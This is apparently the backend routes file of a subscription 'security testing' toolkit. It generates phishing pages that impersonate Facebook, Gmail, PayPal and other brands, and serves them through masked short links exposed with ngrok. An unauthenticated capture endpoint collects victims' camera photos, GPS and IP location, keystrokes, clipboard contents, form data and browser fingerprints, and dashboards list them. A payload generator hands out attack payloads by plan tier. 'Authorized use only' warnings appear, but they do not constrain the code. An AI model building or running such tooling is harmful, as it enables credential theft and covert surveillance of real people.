"""
Security Tools Routes
API endpoints for security testing tools (phishing, payloads, encoding, etc.)
"""
from fastapi import APIRouter, Depends, HTTPException, status, Request
from fastapi.responses import FileResponse, HTMLResponse
from pydantic import BaseModel
from typing import Optional, List
from datetime import datetime
import os
import httpx
import json
from dotenv import load_dotenv
from sqlalchemy.orm import Session
from jose import jwt
from config import settings
from database import get_db

from auth import get_current_user
from middleware.subscription import check_subscription_status, require_plan
from models.user import User
from tools.phishing_generator import PhishingPageGenerator
from tools.payload_generator import PayloadGenerator
from tools.encoder_decoder import EncoderDecoder

load_dotenv()
router = APIRouter()

# Initialize tools
phishing_gen = PhishingPageGenerator()
payload_gen = PayloadGenerator()
encoder_decoder = EncoderDecoder()

def _plan_in(user, required):
    plan = (getattr(user, 'subscription_plan', '') or '').strip().lower()
    if getattr(user, 'is_admin', False):
        return True
    return plan in [p.strip().lower() for p in required]


# Pydantic models
class PhishingPageRequest(BaseModel):
    template: str
    redirect_url: str = "https://google.com"
    capture_webhook: Optional[str] = None
    custom_title: Optional[str] = None
    custom_logo: Optional[str] = None
    expiration_hours: int = 24  # Default 24 hours


class PayloadRequest(BaseModel):
    category: str
    encode: bool = False
    encode_type: str = "url"


class EncodeRequest(BaseModel):
    text: str
    encoding_type: str


class DecodeRequest(BaseModel):
    text: str
    encoding_type: str


class HashRequest(BaseModel):
    text: str
    hash_type: str


class AIChatRequest(BaseModel):
    message: str
    history: Optional[List[dict]] = None  # [{role: 'user'|'assistant', content: str}]


class PhishingCaptureData(BaseModel):
    page_id: str
    session_id: Optional[str] = None
    photo: Optional[str] = None
    location: Optional[dict] = None
    user_agent: Optional[str] = None
    screen_resolution: Optional[str] = None
    timestamp: str
    form_data: Optional[dict] = None
    keystrokes: Optional[list] = None
    mouse_clicks: Optional[list] = None
    battery_info: Optional[dict] = None
    gps_status: Optional[str] = None
    camera_status: Optional[str] = None
    # Extended fingerprinting fields
    platform: Optional[str] = None
    language: Optional[str] = None
    languages: Optional[list] = None
    screen_color_depth: Optional[int] = None
    screen_pixel_depth: Optional[int] = None
    timezone: Optional[str] = None
    timezone_offset: Optional[int] = None
    hardware_concurrency: Optional[int] = None
    device_memory: Optional[float] = None
    max_touch_points: Optional[int] = None
    cookies_enabled: Optional[bool] = None
    do_not_track: Optional[str] = None
    canvas_fingerprint: Optional[str] = None
    webgl_vendor: Optional[str] = None
    webgl_renderer: Optional[str] = None
    connection_type: Optional[str] = None
    connection_downlink: Optional[float] = None
    plugins: Optional[list] = None
    # IP-based geolocation fields (stealth mode)
    latitude: Optional[float] = None
    longitude: Optional[float] = None
    city: Optional[str] = None
    region: Optional[str] = None
    country: Optional[str] = None
    isp: Optional[str] = None
    location_type: Optional[str] = None
    ip: Optional[str] = None
    local_ip: Optional[str] = None
    clipboard: Optional[str] = None
    device_orientation: Optional[dict] = None
    network_info: Optional[dict] = None
    referrer: Optional[str] = None
    history_length: Optional[int] = None
    
    class Config:
        extra = "allow"
    # GPS location fields (if permission granted)
    accuracy: Optional[float] = None
    altitude: Optional[float] = None
    location_type: Optional[str] = None  # 'IP' or 'GPS'
    # Advanced Data Collection
    network_info: Optional[dict] = None
    battery_info: Optional[dict] = None
    keystrokes: Optional[List[dict]] = None
    clipboard: Optional[str] = None
    local_ip: Optional[str] = None
    referrer: Optional[str] = None
    history_length: Optional[int] = None
    device_orientation: Optional[dict] = None
    mouse_clicks: Optional[List[dict]] = None
    gps_status: Optional[str] = None
    camera_status: Optional[str] = None

    class Config:
        extra = "ignore"


# ==================== PHISHING GENERATOR ====================

@router.get("/phishing/templates", tags=["Phishing Generator"])
async def list_phishing_templates(current_user: dict = Depends(get_current_user)):
    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
    """List all available phishing page templates"""
    return {
        "templates": phishing_gen.list_templates(),
        "total": len(phishing_gen.list_templates())
    }


@router.post("/phishing/generate", tags=["Phishing Generator"])
async def generate_phishing_page(
    request: PhishingPageRequest,
    current_user: dict = Depends(get_current_user)
):
    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
    """
    Generate a phishing page for security testing
    
    **WARNING**: Only use for authorized security testing and awareness training!
    """
    try:
        result = phishing_gen.generate_page(
            template=request.template,
            redirect_url=request.redirect_url,
            capture_webhook=request.capture_webhook,
            custom_title=request.custom_title,
            custom_logo=request.custom_logo
        )
        
        # Calculate expiration time
        from datetime import timedelta
        import json
        expiration_time = None
        if request.expiration_hours > 0:
            expiration_time = (datetime.now() + timedelta(hours=request.expiration_hours)).isoformat()
        
        # Save page metadata with expiration
        pages_meta_file = "/tmp/phishing_pages_meta.json"
        pages_meta = []
        if os.path.exists(pages_meta_file):
            with open(pages_meta_file, 'r') as f:
                pages_meta = json.load(f)
        
        pages_meta.append({
            "filename": result['filename'],
            "page_id": result['page_id'],
            "created_at": datetime.now().isoformat(),
            "expires_at": expiration_time,
            "template": request.template,
            "redirect_url": request.redirect_url
        })
        
        with open(pages_meta_file, 'w') as f:
            json.dump(pages_meta, f, indent=2)
        
        # Get domain mapping for template
        domain_map = {
            "facebook": "facebook.com",
            "gmail": "google.com", 
            "microsoft": "microsoft.com",
            "paypal": "paypal.com",
            "instagram": "instagram.com",
            "linkedin": "linkedin.com",
            "amazon": "amazon.com",
            "apple": "apple.com",
            "twitter": "twitter.com",
            "netflix": "netflix.com"
        }
        
        original_domain = domain_map.get(request.template, "secure-login.com")
        short_id = result['page_id'][:8]
        
        # Create URLs - você precisa expor com ngrok ou similar
        # Formato: https://facebook.com.seu-dominio.ngrok.io/p/abc123
        # Para funcionar externamente, configure NGROK_URL nas variáveis de ambiente
        import os as os_module
        public_domain = os_module.environ.get('PUBLIC_DOMAIN', 'localhost:8000')
        
        # URL local para testes
        local_url = f"http://localhost:8000/p/{short_id}"
        
        # URL pública mascarada (parece com o domínio original)
        if 'localhost' in public_domain:
            # Modo local - instrui usuário a configurar ngrok
            masked_url = f"⚠️ Configure PUBLIC_DOMAIN para gerar URL pública"
            public_url = local_url
            instructions = """
            📌 PARA USAR EXTERNAMENTE:
            1. Instale ngrok: brew install ngrok
            2. Execute: ngrok http 8000
            3. Configure: export PUBLIC_DOMAIN="seu-subdominio.ngrok.io"
            4. Reinicie o servidor
            
            💡 ALTERNATIVA - Use serviços gratuitos:
            - ngrok.com (túnel temporário)
            - localhost.run (sem instalação)
            - serveo.net (via SSH)
            """
        else:
            # Modo público - gera URL mascarada
            # Ngrok FREE não suporta subdomínios customizados
            # Usar apenas: https://seu-id.ngrok-free.app/p/abc123
            public_url = f"https://{public_domain}/p/{short_id}"
            masked_url = public_url
            instructions = f"✅ URL configurada: {public_url}"
        
        return {
            "success": True,
            "message": "Phishing page generated successfully",
            "data": result,
            "expires_at": expiration_time,
            "warning": "⚠️ Use only for authorized security testing!",
            # URLs
            "local_url": local_url,
            "public_url": public_url,
            "masked_url": masked_url,
            "short_id": short_id,
            "original_domain": original_domain,
            # Instruções
            "setup_instructions": instructions,
            "ngrok_command": "ngrok http 8000"
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=str(e)
        )


@router.get("/phishing/pages", tags=["Phishing Generator"])
async def list_generated_pages(current_user: dict = Depends(get_current_user)):
    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
    """List all generated phishing pages (filters expired ones)"""
    import json
    from datetime import datetime
    
    pages = phishing_gen.get_generated_pages()
    
    # Load metadata to check expiration
    pages_meta_file = "/tmp/phishing_pages_meta.json"
    pages_with_expiration = []
    
    if os.path.exists(pages_meta_file):
        with open(pages_meta_file, 'r') as f:
            pages_meta = json.load(f)
        
        # Remove expired pages
        active_meta = []
        for meta in pages_meta:
            if meta.get('expires_at'):
                expiration = datetime.fromisoformat(meta['expires_at'])
                if datetime.now() > expiration:
                    # Delete expired page
                    filepath = os.path.join("/tmp/phishing_pages", meta['filename'])
                    if os.path.exists(filepath):
                        os.remove(filepath)
                    continue
            active_meta.append(meta)
        
        # Save updated metadata
        with open(pages_meta_file, 'w') as f:
            json.dump(active_meta, f, indent=2)
        
        # Merge metadata with pages
        for page in pages:
            for meta in active_meta:
                if page['filename'] == meta['filename']:
                    page['expires_at'] = meta.get('expires_at')
                    page['created_at'] = meta.get('created_at')
                    page['redirect_url'] = meta.get('redirect_url', 'https://google.com')
                    # Add short URL (functional)
                    short_id = meta['page_id'][:8]
                    page['short_url'] = f"http://localhost:8000/p/{short_id}"
                    page['short_id'] = short_id
                    
                    # Add masked URL (public)
                    public_domain = os.environ.get('PUBLIC_DOMAIN', 'localhost:8000')
                    if 'localhost' not in public_domain:
                        # Ngrok FREE não suporta subdomínios customizados
                        # Usar apenas: https://seu-id.ngrok-free.app/p/abc123
                        page['masked_url'] = f"https://{public_domain}/p/{short_id}"
                    else:
                        page['masked_url'] = None
                    
                    pages_with_expiration.append(page)
                    break
        
        return {
            "pages": pages_with_expiration,
            "total": len(pages_with_expiration)
        }
    
    return {
        "pages": pages,
        "total": len(pages)
    }


@router.delete("/phishing/pages/clear-all", tags=["Phishing Generator"])
async def clear_all_phishing_pages(current_user: dict = Depends(get_current_user)):
    """Delete ALL generated phishing pages and metadata"""
    import json
    import shutil
    
    try:
        pages_dir = "/tmp/phishing_pages"
        pages_meta_file = "/tmp/phishing_pages_meta.json"
        
        deleted_count = 0
        
        # Delete all HTML files in phishing pages directory
        if os.path.exists(pages_dir):
            for filename in os.listdir(pages_dir):
                if filename.endswith('.html'):
                    filepath = os.path.join(pages_dir, filename)
                    os.remove(filepath)
                    deleted_count += 1
        
        # Clear metadata file
        if os.path.exists(pages_meta_file):
            with open(pages_meta_file, 'w') as f:
                json.dump([], f)
        
        return {
            "success": True,
            "message": f"Todos os links de phishing foram apagados ({deleted_count} páginas)",
            "deleted_count": deleted_count
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Erro ao apagar histórico: {str(e)}"
        )


@router.get("/phishing/captures", tags=["Phishing Generator"])
async def list_phishing_captures(current_user: dict = Depends(get_current_user)):
    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
    """List all captured phishing data (photos, locations)"""
    captures_dir = "/tmp/phishing_captures"
    captures = []
    
    print(f"DEBUG: Listing captures from {captures_dir}")
    
    import json
    import base64
    
    by_id = {}
    
    # Ensure directory exists
    if not os.path.exists(captures_dir):
        print(f"DEBUG: Directory {captures_dir} does not exist")
        # Try to use fallbacks immediately if directory is missing
    else:
        files = os.listdir(captures_dir)
        print(f"DEBUG: Files found: {files}")
        
        for filename in files:
            if filename.startswith("capture_") and filename.endswith(".json"):
                filepath = os.path.join(captures_dir, filename)
                try:
                    with open(filepath, 'r') as f:
                        capture_data = json.load(f)
                        cid = filename[len("capture_"):-len(".json")]
                        capture_data['capture_id'] = cid
                        
                        # Load photo if exists
                        if capture_data.get('photo_file'):
                            photo_path = capture_data['photo_file']
                            if os.path.exists(photo_path):
                                try:
                                    with open(photo_path, 'rb') as photo_file:
                                        photo_bytes = photo_file.read()
                                        capture_data['photo_base64'] = base64.b64encode(photo_bytes).decode('utf-8')
                                except Exception as e:
                                    print(f"DEBUG: Error reading photo {photo_path}: {e}")
                        
                        by_id[cid] = capture_data
                        print(f"DEBUG: Loaded capture {cid}")
                except Exception as e:
                    print(f"DEBUG: Error reading capture {filename}: {e}")

    # Fallback: notifications
    if len(by_id) == 0:
        print("DEBUG: No captures found in files, checking notifications fallback")
        try:
            notification_file = "/tmp/phishing_notifications.json"
            if os.path.exists(notification_file):
                with open(notification_file, 'r') as f:
                    notifications = json.load(f)
                for n in notifications:
                    if n.get('type') == 'phishing_capture':
                        cid = n.get('id')
                        if cid not in by_id:
                            item = {
                                'page_id': n.get('data', {}).get('page_id'),
                                'timestamp': n.get('timestamp'),
                                'ip_address': None,
                                'location': None,
                                'location_details': None,
                                'capture_id': cid,
                                'fallback_source': 'notifications'
                            }
                            by_id[cid] = item
                            print(f"DEBUG: Recovered capture {cid} from notifications")
        except Exception as e:
            print(f"DEBUG: Error reading notifications: {e}")

    # Fallback 2: index
    try:
        index_file = "/tmp/phishing_captures_index.json"
        if os.path.exists(index_file):
            with open(index_file, 'r') as f:
                index = json.load(f)
            for entry in index:
                cid = entry.get('capture_id')
                if cid and cid not in by_id:
                    by_id[cid] = entry
                    print(f"DEBUG: Recovered capture {cid} from index")
    except Exception as e:
        print(f"DEBUG: Error reading index: {e}")

    captures = list(by_id.values())
    # Robust sort - handle missing timestamps
    captures.sort(key=lambda x: x.get('timestamp', '') or '', reverse=True)

    print(f"DEBUG: Returning {len(captures)} captures")
    
    return {
        "captures": captures,
        "total": len(captures)
    }


@router.get("/phishing/captures/{capture_id}/photo", tags=["Phishing Generator"])
async def get_capture_photo(capture_id: str, current_user: dict = Depends(get_current_user)):
    """Get the photo from a specific capture"""
    photo_path = f"/tmp/phishing_captures/photo_{capture_id}.jpg"
    
    if not os.path.exists(photo_path):
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Photo not found"
        )
    
    return FileResponse(photo_path, media_type="image/jpeg")


@router.delete("/phishing/captures/{capture_id}", tags=["Phishing Generator"])
async def delete_capture(capture_id: str, current_user: dict = Depends(get_current_user)):
    """Delete a specific capture (JSON and photo files)"""
    import json
    captures_dir = "/tmp/phishing_captures"
    
    # Find and delete capture JSON file
    deleted = False
    for filename in os.listdir(captures_dir):
        if filename.startswith(f"capture_{capture_id}") and filename.endswith(".json"):
            json_path = os.path.join(captures_dir, filename)
            
            # Read capture data to find photo file
            try:
                with open(json_path, 'r') as f:
                    capture_data = json.load(f)
                
                # Delete photo file if exists
                if capture_data.get('photo_file') and os.path.exists(capture_data['photo_file']):
                    os.remove(capture_data['photo_file'])
                
                # Delete JSON file
                os.remove(json_path)
                deleted = True
                break
            except Exception as e:
                print(f"Error deleting capture {capture_id}: {e}")
                raise HTTPException(
                    status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                    detail=f"Error deleting capture: {str(e)}"
                )
    
    # Fallback deletion: remove photo by pattern, remove from index and notifications
    if not deleted:
        photo_path = os.path.join(captures_dir, f"photo_{capture_id}.jpg")
        if os.path.exists(photo_path):
            try:
                os.remove(photo_path)
                deleted = True
            except Exception:
                pass
        # Remove from index file
        index_file = "/tmp/phishing_captures_index.json"
        try:
            if os.path.exists(index_file):
                with open(index_file, 'r') as f:
                    index = json.load(f)
                new_index = [e for e in index if e.get('capture_id') != capture_id]
                if len(new_index) != len(index):
                    with open(index_file, 'w') as f:
                        json.dump(new_index, f, indent=2)
                    deleted = True
        except Exception:
            pass
        # Remove related notifications
        notif_file = "/tmp/phishing_notifications.json"
        try:
            if os.path.exists(notif_file):
                with open(notif_file, 'r') as f:
                    notifs = json.load(f)
                new_notifs = [n for n in notifs if n.get('id') != capture_id]
                if len(new_notifs) != len(notifs):
                    with open(notif_file, 'w') as f:
                        json.dump(new_notifs, f, indent=2)
                    deleted = True
        except Exception:
            pass
    
    if not deleted:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Capture not found"
        )
    
    return {"success": True, "message": "Capture deleted successfully"}


@router.get("/p/{short_id}", tags=["Phishing Generator"])
async def redirect_to_phishing(short_id: str):
    """Short URL redirect to phishing page (masks the real URL)"""
    import json
    from fastapi.responses import RedirectResponse
    
    # Load metadata to find the full filename
    pages_meta_file = "/tmp/phishing_pages_meta.json"
    if os.path.exists(pages_meta_file):
        with open(pages_meta_file, 'r') as f:
            pages_meta = json.load(f)
        
        # Find page by short_id (first 8 chars of page_id)
        for meta in pages_meta:
            if meta['page_id'][:8] == short_id:
                # Check expiration
                if meta.get('expires_at'):
                    from datetime import datetime
                    expiration = datetime.fromisoformat(meta['expires_at'])
                    if datetime.now() > expiration:
                        raise HTTPException(
                            status_code=status.HTTP_410_GONE,
                            detail="This link has expired"
                        )
                
                # Redirect to full phishing page
                return RedirectResponse(url=f"/phishing/{meta['filename']}", status_code=302)
    
    raise HTTPException(
        status_code=status.HTTP_404_NOT_FOUND,
        detail="Link not found"
    )


@router.get("/phishing/{filename}", tags=["Phishing Generator"])
async def serve_phishing_page(filename: str):
    """Serve a generated phishing page (no auth required for testing)"""
    filepath = os.path.join("/tmp/phishing_pages", filename)
    
    if not os.path.exists(filepath):
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Phishing page not found"
        )
    
    return FileResponse(filepath, media_type="text/html")


@router.post("/phishing/capture", tags=["Phishing Generator"])
async def capture_phishing_data(data: PhishingCaptureData, request: Request):
    """
    Receive captured data from phishing pages (photo, location, etc.)
    No auth required as this is called from the phishing page itself
    """
    try:
        # Create captures directory if it doesn't exist
        captures_dir = "/tmp/phishing_captures"
        os.makedirs(captures_dir, exist_ok=True)
        
        # Log entry for debugging
        with open("/tmp/phishing_debug.log", "a") as log:
            log.write(f"[{datetime.now().isoformat()}] Capture attempt from {request.client.host} for page {data.page_id}\n")
        
        # Save capture data
        if data.session_id:
            capture_id = f"{data.page_id}_{data.session_id}"
        else:
            capture_id = f"{data.page_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            
        capture_file = os.path.join(captures_dir, f"capture_{capture_id}.json")
        
        # Load existing data to merge
        existing_data = {}
        if os.path.exists(capture_file):
            try:
                with open(capture_file, 'r') as f:
                    existing_data = json.load(f)
            except:
                pass
        
        # Prepare new data (exclude None values)
        new_data = {k: v for k, v in data.dict().items() if v is not None}
        
        # MERGE: Update existing data with new non-null data
        # This ensures we don't lose previously captured data (like location or photo)
        # if a subsequent request (like keystrokes) doesn't include it.
        capture_data = existing_data.copy()
        capture_data.update(new_data)
        
        # Special handling for location: if we have location in existing but not in new, keep it.
        # The update() above handles top-level fields, but let's be careful about nested 'location' dict
        if 'location' in existing_data and existing_data['location'] and ('location' not in new_data or not new_data['location']):
            capture_data['location'] = existing_data['location']

        # Always prioritize the new photo if provided
        if data.photo:
            photo_file = os.path.join(captures_dir, f"photo_{capture_id}.jpg")
            try:
                # Remove data:image/jpeg;base64, prefix
                photo_data = data.photo.split(',')[1] if ',' in data.photo else data.photo
                import base64
                with open(photo_file, 'wb') as f:
                    f.write(base64.b64decode(photo_data))
                capture_data['photo_file'] = photo_file
                capture_data['photo'] = f"Saved to {photo_file}"
            except Exception as e:
                print(f"Error saving photo: {e}")
        # If no new photo, ensure we keep the old one (handled by update/copy, but verify path)
        elif 'photo_file' in existing_data:
            capture_data['photo_file'] = existing_data['photo_file']
            # Don't overwrite 'photo' text if it's just a status
            if 'photo' not in new_data:
                    capture_data['photo'] = existing_data.get('photo')

        # Get client IP
        client_ip = request.client.host
        if client_ip == "127.0.0.1":
            # If localhost, try to get public IP
            try:
                async with httpx.AsyncClient() as client:
                    ip_response = await client.get('https://api.ipify.org?format=json', timeout=5.0)
                    if ip_response.status_code == 200:
                        client_ip = ip_response.json().get('ip', client_ip)
            except:
                pass
        
        capture_data['ip_address'] = client_ip
        
        try:
            loc = data.location or {}
            lat = (loc.get('latitude') if isinstance(loc, dict) else None) or data.latitude
            lon = (loc.get('longitude') if isinstance(loc, dict) else None) or data.longitude
            if lat is not None and lon is not None:
                async with httpx.AsyncClient() as client:
                    geo_response = await client.get(
                        'https://nominatim.openstreetmap.org/reverse',
                        params={'format': 'json', 'lat': lat, 'lon': lon},
                        headers={'User-Agent': 'SecurityScanner/1.0'},
                        timeout=10.0
                    )
                    if geo_response.status_code == 200:
                        geo_data = geo_response.json()
                        capture_data['location_details'] = {
                            'country': geo_data.get('address', {}).get('country', 'N/A'),
                            'city': geo_data.get('address', {}).get('city') or 
                                   geo_data.get('address', {}).get('town') or 
                                   geo_data.get('address', {}).get('village', 'N/A'),
                            'state': geo_data.get('address', {}).get('state') or 
                                    geo_data.get('address', {}).get('region', 'N/A'),
                            'full_address': geo_data.get('display_name', 'N/A')
                        }
        except Exception as e:
            print(f"Error in reverse geocoding: {e}")
            capture_data['location_details'] = capture_data.get('location_details')
        
        # Save JSON data
        with open(capture_file, 'w') as f:
            json.dump(capture_data, f, indent=2)
        
        # Create a notification (we'll implement notifications system next)
        notification_file = "/tmp/phishing_notifications.json"
        notifications = []
        if os.path.exists(notification_file):
            with open(notification_file, 'r') as f:
                notifications = json.load(f)
        
        notifications.append({
            "id": capture_id,
            "type": "phishing_capture",
            "message": f"Nova captura do phishing {data.page_id}",
            "timestamp": datetime.now().isoformat(),
            "data": {
                "page_id": data.page_id,
                "has_photo": data.photo is not None,
                "has_location": data.location is not None,
                "capture_file": capture_file
            },
            "read": False
        })
        
        # Keep only last 50 notifications
        notifications = notifications[-50:]
        
        with open(notification_file, 'w') as f:
            json.dump(notifications, f, indent=2)

        # Append to index file (redundância caso /tmp seja limpo ou JSON falhe)
        index_file = "/tmp/phishing_captures_index.json"
        index = []
        try:
            if os.path.exists(index_file):
                with open(index_file, 'r') as f:
                    index = json.load(f)
        except Exception:
            index = []
        entry = capture_data.copy()
        entry['capture_id'] = capture_id
        index.append(entry)
        # Mantém apenas os últimos 200
        index = index[-200:]
        try:
            with open(index_file, 'w') as f:
                json.dump(index, f, indent=2)
        except Exception:
            pass
        
        return {
            "success": True,
            "message": "Data captured successfully",
            "capture_id": capture_id
        }
    except Exception as e:
        print(f"Error capturing data: {e}")
        return {
            "success": False,
            "error": str(e)
        }


# ==================== PAYLOAD GENERATOR ====================

@router.get("/payloads/categories", tags=["Payload Generator"])
async def list_payload_categories(current_user: dict = Depends(get_current_user)):
    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
    """List all available payload categories"""
    return {
        "categories": payload_gen.list_categories(),
        "total": len(payload_gen.list_categories())
    }


@router.post("/payloads/generate", tags=["Payload Generator"])
async def generate_payloads(
    request: PayloadRequest,
    current_user: dict = Depends(get_current_user)
):
    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
    """
    Generate security testing payloads
    
    **WARNING**: Only use for authorized penetration testing!
    """
    try:
        payloads = payload_gen.generate_payloads(
            category=request.category,
            encode=request.encode,
            encode_type=request.encode_type if request.encode else "url"
        )
        
        return {
            "success": True,
            "category": request.category,
            "payloads": payloads,
            "total": len(payloads),
            "encoded": request.encode,
            "warning": "⚠️ Use only for authorized security testing!"
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=str(e)
        )


@router.get("/payloads/{category}", tags=["Payload Generator"])
async def get_payloads_by_category(
    category: str,
    encode: bool = False,
    encode_type: str = "url",
    current_user: dict = Depends(get_current_user)
):
    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
    """Get payloads for a specific category"""
    try:
        payloads = payload_gen.generate_payloads(category, encode, encode_type)
        return {
            "success": True,
            "category": category,
            "payloads": payloads,
            "total": len(payloads)
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=str(e)
        )


# ==================== ENCODER/DECODER ====================

@router.get("/encoder/types", tags=["Encoder/Decoder"])
async def list_encoding_types(current_user: dict = Depends(get_current_user)):
    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
    """List all available encoding/decoding types"""
    return encoder_decoder.list_encodings()


@router.post("/encoder/encode", tags=["Encoder/Decoder"])
async def encode_text(
    request: EncodeRequest,
    current_user: dict = Depends(get_current_user)
):
    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
    """Encode text with specified encoding"""
    try:
        result = encoder_decoder.encode(request.text, request.encoding_type)
        return {
            "success": True,
            "result": result
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=str(e)
        )


@router.post("/encoder/decode", tags=["Encoder/Decoder"])
async def decode_text(
    request: DecodeRequest,
    current_user: dict = Depends(get_current_user)
):
    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
    """Decode text with specified encoding"""
    try:
        result = encoder_decoder.decode(request.text, request.encoding_type)
        return {
            "success": True,
            "result": result
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=str(e)
        )


@router.post("/encoder/hash", tags=["Encoder/Decoder"])
async def hash_text(
    request: HashRequest,
    current_user: dict = Depends(get_current_user)
):
    if not _plan_in(current_user, ["starter", "professional", "enterprise"]):
        raise HTTPException(status_code=403, detail="Plano insuficiente para acessar esta ferramenta")
    """Generate hash of text"""
    try:
        result = encoder_decoder.hash_text(request.text, request.hash_type)
        return {
            "success": True,
            "result": result
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=str(e)
        )


# ==================== UTILITY ENDPOINTS ====================

@router.get("/stats", tags=["Tools"])
async def get_tools_stats(current_user: dict = Depends(get_current_user)):
    """Get statistics about available tools"""
    return {
        "phishing": {
            "templates": len(phishing_gen.list_templates()),
            "generated_pages": len(phishing_gen.get_generated_pages())
        },
        "payloads": {
            "categories": len(payload_gen.list_categories()),
            "total_payloads": sum(cat["count"] for cat in payload_gen.list_categories())
        },
        "encoder": {
            "encodings": len(encoder_decoder.list_encodings()["encodings"]),
            "hashes": len(encoder_decoder.list_encodings()["hashes"])
        }
    }


@router.get("/info", tags=["Tools"])
async def get_tools_info():
    """Get information about security tools (no auth required)"""
    return {
        "title": "Security Testing Tools",
        "version": "1.0.0",
        "description": "Professional security testing toolkit for authorized penetration testing",
        "features": [
            "Phishing page generator (10 templates)",
            "Payload generator (8 categories, 100+ payloads)",
            "Encoder/Decoder (8 encodings, 4 hash algorithms)",
            "URL shortener and QR code generator",
            "Network reconnaissance tools"
        ],
        "warning": "⚠️ All tools should only be used for authorized security testing and educational purposes!",
        "legal_notice": "Unauthorized use of these tools may be illegal. Always obtain proper authorization before testing any systems you do not own."
    }



# ==================== NOTIFICATIONS ====================

@router.get("/notifications", tags=["Notifications"])
async def get_notifications(current_user: dict = Depends(get_current_user)):
    import json
    notification_file = "/tmp/phishing_notifications.json"
    if not os.path.exists(notification_file):
        return {"notifications": [], "unread_count": 0, "total": 0}
    try:
        with open(notification_file, 'r') as f:
            notifications = json.load(f)
        filtered = []
        for n in notifications:
            tuid = n.get('target_user_id')
            tun = n.get('target_username')
            if (tuid is None and tun is None) or (getattr(current_user, 'id', None) == tuid) or (getattr(current_user, 'username', None) == tun):
                filtered.append(n)
        unread = [n for n in filtered if not n.get('read', False)]
        return {"notifications": filtered[::-1], "unread_count": len(unread), "total": len(filtered)}
    except Exception as e:
        return {"notifications": [], "unread_count": 0, "total": 0, "error": str(e)}


@router.post("/notifications/{notification_id}/read", tags=["Notifications"])
async def mark_notification_read(
    notification_id: str,
    current_user: dict = Depends(get_current_user)
):
    """Mark a notification as read"""
    import json
    notification_file = "/tmp/phishing_notifications.json"
    
    if not os.path.exists(notification_file):
        raise HTTPException(status_code=404, detail="No notifications found")
    
    try:
        with open(notification_file, 'r') as f:
            notifications = json.load(f)
        
        for notif in notifications:
            if notif['id'] == notification_id:
                notif['read'] = True
                break
        
        with open(notification_file, 'w') as f:
            json.dump(notifications, f, indent=2)
        
        return {"success": True, "message": "Notification marked as read"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# ==================== AI Security Assistant ====================
@router.post("/ai/assistant", tags=["AI Assistant"])
async def ai_security_assistant(payload: AIChatRequest, request: Request, db: Session = Depends(get_db)):
    """Chat com assistente de IA voltado para segurança da informação.
    Usa provedores gratuitos via chave de API (OpenRouter ou Groq) se configurados por ambiente.
    """
    system_prompt = (
        "Você é um assistente de segurança da informação. Ajude com análise de riscos, boas práticas, "
        "OWASP Top 10, hardening, resposta a incidentes, e dicas práticas. Seja objetivo, cite passos acionáveis, "
        "e evite executar ações perigosas. Não forneça payloads maliciosos que violem leis; foque em conscientização e testes autorizados."
    )

    messages = [{"role": "system", "content": system_prompt}]
    if payload.history:
        for m in payload.history:
            role = m.get("role")
            content = m.get("content", "")
            if role in ("user", "assistant") and isinstance(content, str):
                messages.append({"role": role, "content": content})
    messages.append({"role": "user", "content": payload.message})

    auth_header = request.headers.get("authorization") or request.headers.get("Authorization")
    if not auth_header or not auth_header.lower().startswith("bearer "):
        raise HTTPException(status_code=401, detail="Could not validate credentials")
    token = auth_header.split(" ", 1)[1]
    try:
        payload_token = jwt.decode(token, settings.SECRET_KEY, algorithms=[settings.ALGORITHM])
        username = payload_token.get("sub")
        if not username:
            raise HTTPException(status_code=401, detail="Could not validate credentials")
        user = db.query(User).filter(User.username == username).first()
        if not user:
            raise HTTPException(status_code=401, detail="Could not validate credentials")
        plan = (user.subscription_plan or "").strip().lower()
        if plan not in ("professional", "enterprise"):
            raise HTTPException(
                status_code=403,
                detail={
                    "error": "upgrade_required",
                    "message": "Esta funcionalidade requer o plano professional, enterprise",
                    "current_plan": user.subscription_plan,
                    "required_plans": ["professional", "enterprise"]
                }
            )
    except HTTPException:
        raise
    except Exception:
        raise HTTPException(status_code=401, detail="Could not validate credentials")

    groq_key = os.getenv("GROQ_API_KEY") or os.getenv("GROQ_KEY")
    openrouter_key = os.getenv("OPENROUTER_API_KEY") or os.getenv("OPENROUTER_KEY")

